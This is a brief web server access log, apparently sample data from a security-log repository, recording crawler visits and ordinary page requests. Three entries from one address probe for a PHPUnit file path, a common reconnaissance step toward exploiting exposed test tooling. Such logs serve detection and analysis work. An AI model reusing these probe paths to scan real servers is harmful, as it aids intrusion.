218.93.208.94 - - [15/May/2022:07:26:14 -0700] "GET / HTTP/1.1" 200 13183 "http://www.SecRepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36 Edg/87.0.664.52" 
114.119.149.218 - - [15/May/2022:07:30:40 -0700] "GET /self.logs/error.log.2018-03-20.gz HTTP/1.1" 200 4628 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.20.111 - - [15/May/2022:07:32:06 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
104.40.252.236 - - [15/May/2022:07:33:30 -0700] "GET //vendor/phpunit/phpunit/phpunit.xsd HTTP/1.1" 301 506 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" 
104.40.252.236 - - [15/May/2022:07:33:39 -0700] "GET /vendor/phpunit/phpunit/phpunit.xsd HTTP/1.1" 404 291 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" 
104.40.252.236 - - [15/May/2022:07:40:52 -0700] "GET //vendor/phpunit/phpunit/phpunit.xsd HTTP/1.1" 404 291 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" 
205.178.183.40 - - [15/May/2022:07:43:39 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1" 
66.249.64.115 - - [15/May/2022:07:44:52 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/dns.html HTTP/1.1" 304 277 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
